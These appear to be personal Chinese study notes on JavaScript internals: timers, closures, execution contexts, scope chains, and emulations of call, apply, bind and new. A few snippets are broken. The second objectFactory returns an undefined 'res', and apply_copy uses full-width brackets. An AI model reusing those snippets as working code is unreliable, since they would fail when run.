forEach 方法对数组的每个元素执行一次提供的函数。

	array.forEach(callback(currentValue,index,array){
		do something 
	},this)
	参数：
		currentValue ：数组中正在处理的当前元素
		index： 当前引索
		array： 正在操作的数组
	
		转换之前
			const items = ['item1', 'item2', 'item3'];
			const copy = [];
			
			for (let i=0; i<items.length; i++) {
			  copy.push(items[i])
			}
		转换之后
		
			const items = ['item1', 'item2', 'item3'];
			const copy = [];
			
			items.forEach(function(item){
			  copy.push(item)
			});	     
	
	
	
	







客户端javascript 
	Window对象定义了一些属性，比如，指代Location对象的location属性，Location对象指定当前显示在窗口中的URL，并允许脚本往窗口里载入新的URL：
	
	//设置location属性，从而跳转到新的Web页面
	window.location="http://www.oreilly.com/";
	
	
	Window对象有一个引用自身的属性，叫做window  另一个重要的属性document   表示显示在窗口中的文档
	
	每个Element对象都有style和className属性，允许脚本指定文档元素的CSS样式
	



HTML中的事件处理程序
	为了可交互，JavaScript程序必须定义事件处理程序--浏览器注册JavaScript函数
	JavaScript代码可以通过把函数赋值给Element对象的属性（比如onclick或onmouseover）来注册事件处理程序


时间线
	创建Document对象，开始解析web页面。解析HTML元素和他们的文本内容后添加Element对象和Text节点到文档中。这个阶段 document.readyState = ‘loading’ 。
	遇到link外部css，创建线程加载，并继续解析文档。
	遇到img等，先正常解析dom结构，然后浏览器异步加载src，并继续解析文档。
	遇到script外部js，并且没有设置async、defer，浏览器加载，并阻塞，等待js加载完成并执行该脚本，然后继续解析文档。
	遇到script外部js，并且设置有async、defer，浏览器创建线程加载，并继续解析文档。 对于async属性的脚本，脚本加载完成后立即执行。（禁止使用document.write()）




setinterval() 
	setinterval() 间隔指定的毫秒数不停的执行代码
	window.setInterval("function",毫秒数);
	每三秒弹出 "hello" ：
	
		setInterval(function(){alert("Hello")},3000);
	当前时间
		var myVar=setInterval(function(){myTimer()},1000);
		function myTimer(){
			var d=new Date();
			var t=d.toLocaleTimeString();
			document.getElementById("demo").innerHTML=t;
		}

	钟表
		function startTime(){
			var day = new Date();
			var H = day.getHours();
			var M = day.getMinutes();
			var S = day.getSeconds();
			M=jialing(M);
			S=jialing(S);
			document.getElementById('txt').innerHTML=H+":"+M+":"+S;
			setTimeout(function(){startTime()},1000);
		}
		
			function jialing(i){
			if(i<10){
				i="0"+i;
			}
				return i;
			}
			
		
settimeout() 在指定的毫秒数后执行代码
语法
	window.setTimeout("function", 毫秒数);
 
	等待3秒，然后弹出 "Hello":
	
	setTimeout(function(){alert("Hello")},3000);
	


	因为异步函数必须等主进程运行完毕才会运行，setTimeout()内部回调运行的时候，主进程已经运行完毕了，此时i=6，所以输出6。

	我们试图假设循环中的每个迭代在运行时都会给自己“捕获”一个 i 的副本。但是
	根据作用域的工作原理，实际情况是尽管循环中的五个函数是在各个迭代中分别定义的，
	但是它们都被封闭在一个共享的全局作用域中，因此实际上只有一个 i。

	i是全局作用域下的i  每次加一都会修改全局变量

		for (var i = 1; i <= 5; i++) {
		    setTimeout( function timer(){
		        console.log(i);
		    },i*1000);
		}   //五次6


	只是加入队列
	
	  setTimeout(function(){
	        console.log("111");
	    }, 0); //不是立即执行 只是加到队列中
	    var i = 0;
	    //具体数值根据你的计算机CPU来决定，达到延迟效果就好
	    while (i < 3000000000) {
	        i ++;
	    }
	    console.log("222");
	    结果：
	    	//222
	    	//111


  


    外部的函数将内部嵌套的这个函数作为对象返回
	保留 被声明的位置所处的作用域 的引用

	和大多数的现代化编程语言一样，JavaScript是采用词法作用域的，这就意味着函数的执行依赖于函数定义的时候所产生（而不是函数调用的时候产生的）的变量作用域。为了去实现这种词法作用域，JavaScript函数对象的内部状态不仅包含函数逻辑的代码，除此之外还包含当前作用域链的引用。函数对象可以通过这个作用域链相互关联起来，如此，函数体内部的变量都可以保存在函数的作用域内，这在计算机的文献中被称之为闭包。

	闭包有父函数的作用域 他要访问外部函数的变量对象 所以外部函数在运行结束后里面的变量不会被回收
	闭包含有自己的范围链，父母的范围链和全局范围
		function wait(message) {
		 setTimeout( function timer() {
		 console.log( message );
		 }, 1000 );
		}
		wait( "Hello, closure!" );
	    将一个内部函数（名为 timer）传递给 setTimeout(..)。timer 具有涵盖 wait(..) 作用域
	    的闭包，因此还保有对变量 message 的引用

	当您从函数返回内部函数时，当您尝试调用外部函数时，将不会调用返回的函数。必须首先将外部函数的调用保存在单独的变量中，然后将该变量作为函数调用
	
	function greet() {
	    name = 'Hammad';
	    return function () {
	        console.log('Hi ' + name);
	    }
	}
	
	greet();
	greetLetter = greet();
	greetLetter(); // logs 'Hi Hammad'





	每次迭代我们都需要一个块作用域
	
	缺陷是什么？我们需要更多的闭包作用域，特别是在循环的过程中每个迭
	代都需要一个闭包作用域
	
	在迭代内使用 IIFE 会为每个迭代都生成一个新的作用域，使得延迟函数的回调可以将新的
	作用域封闭在每个迭代内部，每个迭代中都会含有一个具有正确值的变量供我们访问。
	
	用立即执行函数表达式创造了新的函数作用域将timer函数包裹了起来，并用j捕获了每次循环时的i
	
		for (var i=1; i<=5; i++) {
		 (function(j) {
		 setTimeout( function timer() {
		 console.log( j );
		 }, j*1000 );
		 })( i );
		}
		
		for (var i = 1; i <= 5; i++) {
		    (function() {
		        var j = i;
		        setTimeout( function timer() {
		            console.log(j);
		        },i*1000 ); //这一行将i*1000改为j*1000也行，并不影响
		    })();
	
	
	 其他方法
	
	利用ES6 引入的let关键字
	
	每次迭代都会声明  随后的每个迭代都会使用上一个迭代结束时的值来初始化这个变量
	for(let i = 0;i<5;i++) {
	  setTimeout(function timer(){
	    console.log(i);
	  }, i * 1000);
	}
	
	





完整闭包解析
		在JavaScript中，闭包通常被视为某种神奇的独角兽，只有高级开发人员才能真正理解，但事实上，它只是对范围链的简单理解。正如克罗克福德所说，封闭只是：
		
		即使外部函数返回后，内部函数也始终可以访问其外部函数的变量和参数...
		
		下面的代码是一个闭包的例子：
		
		function foo() {
		    var a = 'private variable';
		    return function bar() {
		        alert(a);
		    }
		}
		
		var callAlert = foo();
		
		callAlert(); // private variable
		开发人员常常感到惊讶和困惑的是，a即使在foo()完成执行后，私有变量仍然可用。
		
		但是，如果我们详细查看每个上下文，我们将看到以下内容：
		
		// Global Context when evaluated
		global.VO = {
		    foo: pointer to foo(),
		    callAlert: returned value of global.VO.foo
		    scopeChain: [global.VO]
		}
		
		// Foo Context when evaluated
		foo.VO = {
		    bar: pointer to bar(),
		    a: 'private variable',
		    scopeChain: [foo.VO, global.VO]
		}
		
		// Bar Context when evaluated
		bar.VO = {
		    scopeChain: [bar.VO, foo.VO, global.VO]
		}
		现在我们可以通过调用看到callAlert()，我们得到函数foo()，它返回指针bar()。进入时bar()，bar.VO.scopeChain是[bar.VO, foo.VO, global.VO]。
		
		通过警告a，解释器检查bar.VO.scopeChain名为a但找不到匹配的属性中的第一个VO ，因此立即转到下一个VO , foo.VO.
		
		它检查属性的存在，这次找到一个匹配，将值返回到bar上下文，这解释了为什么即使已经完成了一段时间的执行，也alert给了我们。'private variable'foo()
		
		在文章的这一点上，我们已经涵盖了scope chain它及其lexical环境的细节，以及如何closures和variable resolution工作。本文的其余部分将讨论与上述内容相关的一些有趣情况。
		



		闭包是函数代码及其[[Scope]]属性的组合
		
		[[Scope]]包含所有父上下文的变量对象
		
		我们看到函数在创建时获取[[Scope]]属性，并通过这个属性访问所有父上下文的变量
		
		
		
		function foo() {
		 
		  var x = 10;
		  var y = 20;
		 
		  return function () {
		    alert([x, y]);
		  };
		 
		}
		 
		var x = 30;
		 
		var bar = foo(); // anonymous function is returned
		 
		bar(); // [10, 20]
		处理标识符的时候 词法作用域链是在函数创建的时候定义的  
		
		上述例子清楚的展示了函数（上述例子中指的是函数“foo”返回的匿名函数）的[[Scope]]属性，即使在创建该函数的上下文结束的时候依然存在。
		
		
		函数定义的位置
			let x = 10;
			 
			function foo() {
			  console.log(x);
			}
			 
			(function (funArg) {
			 
			  let x = 20;
			  funArg(); // 10, but not 20
			 
			})(foo);
			























内存 

	栈数据结构  电梯
	
	堆数据结构  书架 
	
	队列数据结构  为了清晰的明白事件循环（Event Loop）的机制
	
	变量对象
		JavaScript的基础数据类型往往都会保存在变量对象中
	    基础数据类型，分别是Undefined、Null、Boolean、Number、String  按值访问
	    var a1 = 0;   // 变量对象
	引用数据类型与堆内存
		JavaScript不允许直接访问堆内存中的位置  操作对象的引用而不是实际的对象  引用类型的值都是按引用访问的
		var b = { m: 20 }; // 变量b存在于变量对象中，{m: 20} 作为对象存在于堆内存中
	 
	JavaScript的内存生命周期
	
		1. 分配你所需要的内存
		2. 使用分配到的内存（读、写）
		3. 不需要时将其释放、归还

词法作用域 
	所有内部函数，静态(从词法上)绑定到父上下文，其中内部函数是在程序代码中物理定义的。
	调用内部函数的顺序无关紧要。
	
	所有内部函数都可以通过静态绑定的作用域链访问外部函数VO。



作用域
	源代码中定义变量的区域
	作用于规定了如何查找变量  也就是确定当前执行代码对变量的访问权限
	查找属性 从函数定义的地方开始查找 不是从函数调用的地方开始查找

	动态作用域和静态作用域，决定的是作用域链的顺序

	词法作用域决定了变量查找的顺序，这个顺序是从函数内部开始，然后到函数定义的外层

	范围是指变量的可见性，而上下文是指this在同一范围内的值

	内部函数可以访问其父作用域的变量和其他资源。这意味着子函数在词法上绑定到其父项的执行上下文




执行上下文栈
    对于每个执行上下文，都有三个重要属性：   
		变量对象( VO)
		作用域链(Scope chain)
		this


	！ ！！在作用域里 遇到可执行代码 就会进入执行上下文  javascript 引擎创建了执行上下文栈 来管理执行上下文

	作用域和执行上下文 区别	 
		作用域是静态的, 只要函数定义好了就一直存在, 且不会再变化 
		上下文环境是动态的, 调用函数时创建, 函数调用结束时上下文环境就会被释放 


	遇到以下三种情况，都会生成一个执行上下文，并压入栈中，而处于栈顶的上下文执行完毕之后，就会自动出栈
		全局环境
		函数环境
		eval
	
	定义： 执行上下文栈是执行上下文的活动记录
	        1. 在全局代码执行前, JS引擎就会创建一个栈来存储管理所有的执行上下文对象
	        2. 在全局执行上下文确定后, 将其添加到栈中(压栈)
	        3. 在函数执行上下文创建后, 将其添加到栈中(压栈)
	        4. 在当前函数执行完后,将栈顶的对象移除(出栈)
	        5. 当所有的代码执行完后, 栈中只剩下在全局执行上下文


	一个作用域 可以有多个执行上下文  处于活动状态的只有一个
	
	1. 上下文环境是从属于所在的作用域 
	2. 全局上下文环境==>全局作用域 
	3. 函数上下文环境==>对应的函数使用域



	执行上下文环境 是理解变量对象和作用域链的基础
	
	
	function changeColor() {
	    function swapColors() {}
	    swapColors(); // swapcolors的执行上下文入栈 
	}
	changeColor(); //激活函数 创建自己的执行上下文  changecolor的执行上下文栈
	
	结论
		单线程
		只有栈顶的上下文处于执行中，其他上下文需要等待
		全局上下文只有唯一的一个，它在浏览器关闭时出栈
		函数的执行上下文的个数没有限制
		每次某个函数被调用，就会有个新的执行上下文为其创建，即使是调用的自身函数，也是如此
	
	
	


变量对象
	        

   执行上下文的数据是以变量对象的属性形式进行存储的

	一个变量对象存储以下内容:
		变量(声明的变量,var)
		函数声明(简写为FD)
		在上下文中,函数声明的形式参数
	                            

    我们总是会在程序中定义一些函数和变量，之后会使用这些函数和变量来构建我们的系统。
	然而，对于解释器来说，它又是如何以及从哪里找到这些数据的（函数，变量）？当引用一个对象的时候，在解释器内部又发生了什么
	
	
	
	
	变量对象就是 JavaScript 对作用域这个概念的实现。而且，作用域链其实就是变量对象链           
	
	
	变量对象是与执行上下文相关的数据作用域，存储了在上下文中定义的变量和函数声明。
	
		全局上下文
			因为不同执行上下文下(环境)的变量对象稍有不同， 全局上下文下的变量对象和函数上下文下的变量对象 不一样 因为环境不一样
		
		    全局对象：在我的环境里 我可以用本层的东西 不能用下一层的东西  全局对象是作用域链的头  
		
		    全局对象是由 Object 构造函数实例化的一个对象。
		
		    var a = 1; console.log(this.a); 是全局变量的宿主
		
		    全局上下文 中的变量对象 是全局对象
		
		函数上下文
		    
			面试的时候被问到变量对象和活动对象有什么区别？
			
			他们其实都是同一个对象，只是处于执行上下文的不同生命周期。 只有处于函数调用栈栈顶的执行上下文中的变量对象，才会变成活动对象。
		    激活的变量对象 是活动对象   AO = VO + function parameters(形参) + arguments(实参)
				
		


执行上下文的生命周期：  	
		一、创建阶段 
			 在这个阶段中，执行上下文会分别：  创建变量（激活）对象   建立作用域链   确定this的指向
			 创建变量（激活）对象
			 		变量对象包括
						1.函数的所有形参
							 没有实参，属性值设为 undefined
						2.函数声明
							在变量对象中以函数名建立一个属性，属性值为指向该函数所在内存地址的引用
							已存在 就替换
						3.内部变量 	
							每找到一个变量声明，就在变量对象中以变量名建立一个属性，属性值为undefined
							已存在 就跳过
			
						例子
						function foo(a) {
						  var b = 2;
						  function c() {}
						  var d = function() {};
						
						  b = 3;
						
						}
						
						foo(1);
						
						AO = {
						    arguments: {
						        0: 1,
						        length: 1
						    },
						    a: 1,
						    b: undefined,
						    c: reference to function c(){},
						    d: undefined
						}
			 建立作用域链
			 	可见范围链在变量对象之后创建   用于解析变量  当被要求解析变量时 从最内层开始查找 并继续跳回到父作用域 直到找到为止
			 	    作用域链 包含它自己的变量对象和父执行上下文的其他变量对象   
			 确定this的指向
	
					
	
		执行阶段
			完成变量赋值，函数引用，分配其他值并最终执行代码。
			 
				顺序执行  
					AO = {
					    arguments: {
					        0: 1,
					        length: 1
					    },
					    a: 1,
					    b: 3,
					    c: reference to function c(){},
					    d: reference to FunctionExpression "d"
					}
		
					小总结：
					函数上下文的变量对象初始化只包括 Arguments 对象
		
					在进入执行上下文时会给变量对象添加形参、函数声明、变量声明等初始的属性值 或明确的值 
		
					在代码执行阶段，会再次修改变量对象的属性值  比如表达式 var d = function() {};
					                 
						例子
							function foo() {
							    console.log(a); //  a is not defined。
							    a = 1;
							}
	
						AO = {
						    arguments: {
						        length: 0
						    }
						}				
						这是因为函数中的 "a" 并没有通过 var 关键字声明，所有不会被存放在 AO 中  
						没有 a 的值，然后就会到全局去找，全局也没有，所以会报错。
		




		对变量的间接引用（通过VO的属性名）只允许发生在全局上下文中的变量对象上   
                                       
		对于其他的上下文而言，是无法直接引用VO的，因为VO是实现层的。


			!!!声明新的变量和函数的过程其实就是在VO中创建新的和变量以及函数名对应的属性和属性值的过程
			
					如下 
					var a = 10;
					 
					function test(x) {
					  var b = 20;
					};
					 
					test(30);
					
					
					//全局上下文中的变量对象
					globalcontext.VO={
						a:10,
						test:
					}
					
					//函数上下文的变量对象
					test_functioncontext={
						x:30,
						b:20
					}
			


	
作用域链 

	定义：作用域链是一条变量对象的链，它和执行上下文有关，用于在处理标识符时候进行变量查询。

	函数的创建和激活两个时期来讲解作用域链是如何创建和变化的	

	函数创建 

	函数的作用域在函数定义的时候就决定了。

	这是因为函数有一个内部属性 [[scope]]，当函数创建的时候，就会保存所有父变量对象到其中，
	
	[[Scope]]是一个包含了所有上层变量对象的分层链，它属于当前函数上下文，并在函数创建的时候，保存在函数中
	
	[[Scope]]与Scope(作用域链)是不同的，前者是函数的属性，后者是上下文的属性
	
	
	
	three() Scope Chain = [ [three() VO] + [two() VO] + [one() VO] + [Global VO] ];
	three()总是静态地绑定到two()，而这两者又总是绑定到one()，以此类推。这提供了一个链接效果，
	所有内部函数都可以通过静态绑定的作用域链访问外部函数VO
	
	Scope = VO + All Parent VOs 
	
	函数上下文的作用域链 = AO + [[Scope]]	
	
	Scope = [AO].concat([[Scope]]);


		

作用域链 例子

	var x = 10;
	function foo() {
	  var y = 20;
	  function bar() {
	    var z = 30;
	    alert(x +  y + z);
	  }
	  bar();
	} 
	foo(); // 60
	
	
	全局作用域 foo函数创建 进入上下文 压栈  初始化  bar函数  进入上下文  压栈  初始化  执行  作用域链查找  完毕
	
		全局上下文
		
			global_Context.VO===global={
				x=10
				foo:
			}
		
		foo 函数创建 
			foo.[[scope]]={
				global_context.VO
			}
		
		foo函数激活（进入上下文时）
			foo_context.AO={
				y:20
				bar:
			}
		
		foo函数上下文的作用域链
			
			foo_context.scope=foo_context.AO+foo.[[scope]]
			
			foo_context.scope=[
				foo_context.AO,
			    global_context.VO
			    ]
		
		
		bar 函数创建
			bar.[[Scope]] = [
			  fooContext.AO,
			  globalContext.VO
			];
		
		bar激活
		
			barContext.AO = {
			  z: 30
			};
		
		bar函数上下文的作用域链
		
			barContext.Scope = barContext.AO + bar.[[Scope]] // i.e.:
			 
			barContext.Scope = [
			  barContext.AO,
			  fooContext.AO,
			  globalContext.VO
			];
		
		如下是x y z标识符的查询过程：
		
		 "x"
		  	barContext.AO // not found
		  	fooContext.AO // not found
		  	globalContext.VO // found - 10
		 "y"
		  	barContext.AO // not found
		  	fooContext.AO // found - 20
		 "z"
		  	barContext.AO // found - 30
		
		
		
	
	     多个角度 少点偏见  
	
	     多看几份资料 
	




初始化 例子
	var scope = "global scope";
	function checkscope(){
	    var scope2 = 'local scope';
	    return scope2;
	}
	checkscope();
	
	
	
	
	创建函数 保存作用域链 进入函数  创建上下文 压栈  初始化
	 （ 创建上下文作用域链   创建活动对象   初始化活动对象  压人作用域链顶端） 执行函数
	
	
		函数被创建 保存作用链到内部属性[[scope]]
		
			checkscope.[[scope]] = [
			    globalContext.VO
			];
			
		执行函数  创建上下文  压入栈中
		
			ECStack = [
			    checkscopeContext,
			    globalContext
			];
		
		不立即执行 开始准备工作
			1.复制函数[[scope]]属性创建 上下文作用域链
				checkscopeContext = {
				    Scope: checkscope.[[scope]],
				}
			
			2.用 arguments 创建活动对象，随后初始化活动对象，加入形参、函数声明、变量声明
			
				checkscopeContext = {
				    AO: {
				        arguments: {
				            length: 0
				        },
				        scope2: undefined
				    }，
				    Scope: checkscope.[[scope]],
				}
			
			3.将活动对象压人作用域链顶端
			checkscopeContext = {
			    AO: {
			        arguments: {
			            length: 0
			        },
			        scope2: undefined
			    },
			    Scope: [checkscope.AO, checkscope.[[scope]]]
			}
		
		
		准备工作做完，开始执行函数
		
			checkscopeContext = {
			    AO: {
			        arguments: {
			            length: 0
			        },
			        scope2: 'local scope'
			    },
			    Scope: [AO, [[Scope]]]
			}
			
		
		
		查找到 scope2 的值，返回后函数执行完毕  弹出
		
		

执行上下文完整过程

	创建函数  保存作用链 创建上下文  压栈  上下文初始化  执行   查找  完毕  弹出
	
	var scope = "global scope";
	function checkscope(){
	    var scope = "local scope";
	    function f(){
	        return scope;
	    }
	    return f();
	}
	checkscope();
	
	执行全局代码，创建全局执行上下文，全局上下文被压入执行上下文栈
		
		ECStack = [
		        globalContext
		    ];
		全局上下文初始化
			globalContext = {
			       VO: [global],
			       Scope: [globalContext.VO],
			       this: globalContext.VO
			   }
		
		（初始化的同时）checkscope 函数被创建，保存作用域链到函数的内部属性[[scope]]
		 	checkscope.[[scope]] = [
		 	     globalContext.VO
		 	   ];
		
		执行 checkscope 函数，创建 checkscope 函数执行上下文 压入栈中
		    ECStack = [
		        checkscopeContext,
		        globalContext
		    ];
		
		checkscope 函数执行上下文初始化：
			1.复制函数 [[scope]] 属性创建作用域链，
			2.用 arguments 创建活动对象，
		
			3.初始化活动对象，即加入形参、函数声明、变量声明，
			4.将活动对象压入 checkscope 作用域链顶端。
		
		f 函数被创建，保存作用域链到 f 函数的内部属性[[scope]]
		    checkscopeContext = {
		        AO: {
		            arguments: {
		                length: 0
		            },
		            scope: undefined,
		            f: reference to function f(){}
		        },
		        Scope: [AO, globalContext.VO],
		        this: undefined
		    }
		
		执行 f 函数，创建 f 函数执行上下文
		    ECStack = [
		        fContext,
		        checkscopeContext,
		        globalContext
		    ];
		
		f 函数执行上下文初始化,
			1.复制函数 [[scope]] 属性创建作用域链
			2.用 arguments 创建活动对象
			3.初始化活动对象，即加入形参、函数声明、变量声明
			4.将活动对象压入 f 作用域链顶端
			fContext = {
		        AO: {
		            arguments: {
		                length: 0
		            }
		        },
		        Scope: [AO, checkscopeContext.AO, globalContext.VO],
		        this: undefined
		    }
		
		f 函数执行，沿着作用域链查找 scope 值，返回 scope 值
		
		
		f 函数执行完毕  弹出
			ECStack = [
			       checkscopeContext,
			       globalContext
			   ];
		checkscope 函数执行完毕
			ECStack = [
			       globalContext
			   ];
		
		
		
		
		
	
	



	
	












冴羽

参数传递

	按值传递
		所有函数的参数都是按值传递的
		就是把函数外部的值复制一份给函数内部的参数
		原值是value  拷贝的值叫_value 修改_value  不会影响原值value
		var value = 1;
		function foo(v) {
		    v = 2;
		    console.log(v); //2
		}
		foo(value);
		console.log(value) // 1	
	
	共享传递
	    注意: 按引用传递是传递对象的引用，而按共享传递是传递对象的引用的副本！
	    参数如果是基本类型是按值传递，如果是引用类型按共享传递。
	
		但是因为拷贝副本也是一种值的拷贝，所以在高程中也直接认为是按值传递了。
		var obj = {
		    value: 1
		};
		function foo(o) {
		    o = 2;
		    console.log(o); //2
		}
		foo(obj);
		console.log(obj.value) // 1
	
	

call

	call() 方法在使用 一个指定的this值和若干个指定的参数值 的前提下调用某个函数或方法
	
		var foo = {
		    value: 1
		};
		
		function bar() {
		    console.log(this.value);
		}
		
		bar.call(foo); // 1
		注意两点：
		
			call 改变了 this 的指向，指向到 foo
			bar 函数执行了
	
	var foo={
		value:1,
		bar:function(){
			console.log(this.value)
		}
	};
	foo.bar()
	步骤：
	将函数设为对象的属性
	执行该函数
	删除该函数
	
	
	Function.prototype.call2 = function(context) {
	    // 首先要获取调用call的函数，用this可以获取
	    context.fn = this;
	    context.fn();
	    delete context.fn;
	}
	
	
	Function.prototype.call2 = function (context) {
	    var context = context || window;
	    context.fn = this;
	
	    var args = [];
	    for(var i = 1, len = arguments.length; i < len; i++) {
	        args.push('arguments[' + i + ']');
	    }
	
	    var result = eval('context.fn(' + args +')');
	     
	      
			//假设 args 为：
			//
			//var args = [arguments[1], arguments[2]]
			//然后
			//
			//eval('context.fn(' + args +')');
			//传入 eval 函数中的字符串为：
			//
			//'context.fn(arguments[1], arguments[2])'
			//eval 就解析为：
			//
			//context.fn(arguments[1], arguments[2])
			//
	
	
	    delete context.fn
	    return result;
	}
	
	// 测试一下
	var value = 2;
	
	var obj = {
	    value: 1
	}
	
	function bar(name, age) {
	    console.log(this.value);
	    return {
	        value: this.value,
	        name: name,
	        age: age
	    }
	}
	
	bar.call2(null); // 2
	
	console.log(bar.call2(obj, 'kevin', 18));
	// 1
	// Object {
	//    value: 1,
	//    name: 'kevin',
	//    age: 18
	// }
	
	
	
	语法
	fun.call(thisArg, arg1, arg2 )
		thisArg =>  fun函数运行时的this值，
		            非严格模式下可为null,undefined,此时this值会自动指向全局对象,
		            值为原始值(数字，字符串，布尔值)的this会指向该原始值的自动包装对象。
		arg1,arg2,   => fun函数运行时的 参数列表
		
		 
	
	
		扩展运算符（spread）是三个点（...）  将一个数组转为用逗号分隔的参数序列。
		
			console.log(...[1, 2, 3])
			// 1 2 3
			
			console.log(1, ...[2, 3, 4], 5)
			// 1 2 3 4 5
			
			[...document.querySelectorAll('div')]
			// [<div>, <div>, <div>]
	
	
	 
	es6的写法
	Function.prototype.call2=function(context,...arg2){
	 	context=context||window;
	 	var args=[];
	 	for(let i=1; i<arguments.length; i++){
	 		args.push(arguments[i]);
	 	}
	
		context.fn=this;
		let result =context.fn(...args);
		delete context.fn;
		return result;
	 }
	
	
	// Function.prototype.call2 = function (context, ...args) {
	//    context = context || window
	//    context.__fn__ = this
	//    let result = context.__fn__(...args)
	//    delete context.__fn__
	//    return result
	//} 
	
	
	var o = {
	 	value:1
	 }
	 function foo(){
	 	console.log(this.value)
	 }
	 foo.call2(o)
	
	
	apply
		Function.prototype.apply1 = function (context, arr) {
		    var context = Object(context) || window;
		    context.fn = this;
		
		    var result;
		    if (!arr) {
		        result = context.fn();
		    }
		    else {
		        var args = [];
		        for (var i = 0, len = arr.length; i < len; i++) {
		            args.push('arr[' + i + ']');
		        }
		        result = eval('context.fn(' + args + ')')
		    }
		
		    delete context.fn
		    return result;
		}
	 
	es6 apply
	
	Function.prototype.apply_copy = function(context,arr) {
	    context = context || window;        //因为context可能为null或者undefined 此时的this应指向window
	    let args = arr || ［］;             //获取函数内的参数数组
	    context.fn = this;                  //为当前上下文绑定函数，此处的this代表调用apply方法的函数
	    let result = context.fn(...args);   //运行绑定的方法，且改变this指向到context
	    delete context.fn;                  //删除该方法的属性
	    return result;                      
	}
	
	

模拟 bind

	例子
		function list() {
		  return Array.prototype.slice.call(arguments);
		}
		
		var list1 = list(1, 2, 3); // [1, 2, 3]
		
		// 预定义参数37
		var leadingThirtysevenList = list.bind(undefined, 37);
		
		var list2 = leadingThirtysevenList(); // [37]
		var list3 = leadingThirtysevenList(1, 2, 3); // [37, 1, 2, 3]
	
	
	
	
	拆分一下关键思路
	因为bind方法不会立即执行函数，需要返回一个待执行的函数（这里用到闭包，可以返回一个函数）return function(){}
	
	作用域绑定，这里可以使用apply或者call方法来实现 xx.call(yy)/xx.apply(yy)
	
	参数传递，由于参数的不确定性，需要用apply传递数组（实例更明了）xx.apply(yy,[...Array...])，如果用call就不太方便了，因为call后面的参数需要一个个列出来
	
	
	
	bind方法会创建一个新函数 当这个新函数被调用时 bind()的第一个函数将作为他的this
	 之后的一系列参数 将会在传递的实参前传入 作为他的参数
	
	
	
	第一版
		0	 Function.prototype.bind2=function(context){
		3	  	var self = this;
		4	  	return function(){
		7 9	  		return self.apply(context)
		5	  	}
			  }
			 
		1	 var foo = {
			     value: 1
			 };
			 
			 function bar() {
		8	 	return this.value;
			 }
			 
		2	 var bindFoo = bar.bind(foo);
			 
		6 10	console.log(bindFoo()); // 1
		
	
	
	第二版
		Function.prototype.bind2=function(context){
		 	var self=this; //self=bar()
		 	var args = Array.prototype.slice.call(arguments,1);  //args=array('daisy')   arguments= [foo daisy]
		 	return function(){
		 		var bindargs =Array.prototype.slice.call(arguments); //arguments=[18]
		 		return self.apply(context,args.concat(bindargs))  // args=array('daisy')  bindargs=[18]
		 	}
		 }
		var foo = {
		    value: 1
		};
		
		function bar(name, age) {
		    console.log(this.value);
		    console.log(name);
		    console.log(age);
		
		}
		
		var bindFoo = bar.bind(foo, 'daisy');
		bindFoo('18');
		// 1
		// daisy
		// 18
	
	第三版
	
		Function.prototype.bind2 = function (context) {
		    var self = this;
		    var args = Array.prototype.slice.call(arguments, 1);
		
		    var fBound = function () {
		        var bindArgs = Array.prototype.slice.call(arguments);
		        // 当作为构造函数时，this 指向实例，此时结果为 true，将绑定函数的 this 指向该实例，可以让实例获得来自绑定函数的值
		        // 以上面的是 demo 为例，如果改成 `this instanceof fBound ? null : context`，实例只是一个空对象，将 null 改成 this ，实例会具有 habit 属性
		        // 当作为普通函数时，this 指向 window，此时结果为 false，将绑定函数的 this 指向 context
		        return self.apply(this instanceof fBound ? this : context, args.concat(bindArgs));
		    }
		    // 修改返回函数的 prototype 为绑定函数的 prototype，实例就可以继承绑定函数的原型中的值
		    fBound.prototype = this.prototype;
		    return fBound;
		}
		
		var value = 2;
		
		var foo = {
		    value: 1
		};
		
		function bar(name, age) {
		    this.habit = 'shopping';
		    console.log(this.value);
		    console.log(name);
		    console.log(age);
		}
		
		bar.prototype.friend = 'kevin';
		
		var bindFoo = bar.bind2(foo, 'daisy');
		
		var obj = new bindFoo('18');
		// undefined
		// daisy
		// 18
		console.log(obj.habit);
		console.log(obj.friend);
		// shopping
		// kevin
		
		
	
	
	
	
	
	
	
	
	
	 
	 
	
	
	fNOP.prototype = this.prototype; 就是将 this.prototype 原型对象作为 fNOP.prototype 的原型对象，也就是 this.prototype 和 fNOP.prototype 指向同一个对象。
	
	像 var f = new fNOP(); 之后找原型链上的属性，就是通过 f.__proto__，
	
	因为 f.__proto__ == fNOP.prototype == this.prototype
	
	就会去 this.prototype 上找属性了。
	
	
	
	 if (this.prototype) {
	      // Function.prototype doesn't have a prototype property
	      fNOP.prototype = this.prototype; 
	    }
	    // 下行的代码使fBound.prototype是fNOP的实例,因此
	    // 返回的fBound若作为new的构造函数,new生成的新对象作为this传入fBound,新对象的__proto__就是fNOP的实例
	    fBound.prototype = new fNOP();
	
	

模拟new


	要求：
		访问到otaku构造函数里的属性
		访问到原型里的属性
	
	换种方式 
		var person = new otaku(...);
		var person = objectFactory(otaku,...)      
	
	第一版
	function objectfactory(){
		var obj = new Object();                   
		constructor = [].shift.call(arguments);   
		obj.__proto__=constructor.prototype;     
		constructor.apply(obj,arguments);        
		return obj;
	}
	说明：
	1.用new Object() 的方式新建了一个对象 obj
	2.取出第一个参数，就是我们要传入的构造函数。此外因为 shift 会修改原数组，所以 arguments 会被去除第一个参数
	3.将 obj 的原型指向构造函数，这样 obj 就可以访问到构造函数原型中的属性
	4.使用 apply，改变构造函数 this 的指向到新建的对象，这样 obj 就可以访问到构造函数中的属性
	
	
	第二版的代码
	function objectFactory() {
	
	    var obj = new Object(),                         // 声明一个中间对象，该对象为最终返回的实例
	
	    Constructor = [].shift.call(arguments);         //获得第一个参数（就是构造函数）
	
	    obj.__proto__ = Constructor.prototype;          //将实例的原型指向构造函数的原型
	
	    var ret = Constructor.apply(obj, arguments);    //ret为构造函数执行的结果，这里通过apply，将构造函数内部的this指向修改为指向obj， 实例对象可以访问构造函数中的属性
	
	    // 当我们在构造函数中明确指定了返回对象时，那么new的执行结果就是该返回对象
    	if ((typeof ret === "object" || typeof ret === "function") && ret !== null) {
    	    return ret;
    	}

    	// 如果没有明确指定返回对象，则默认返回res，这个res就是实例对象
    	return res;
	
		};
		 
	
	
	
	function Otaku (name, age) {
	    this.name = name;
	    this.age = age;
	
	    this.habit = 'Games';
	}
	
	Otaku.prototype.strength = 60;
	
	Otaku.prototype.sayYourName = function () {
	    console.log('I am ' + this.name);
	}
	
	function objectFactory() {
	    var obj = new Object(),
	    Constructor = [].shift.call(arguments);
	    obj.__proto__ = Constructor.prototype;
	    Constructor.apply(obj, arguments);
	    return obj;
	};
	
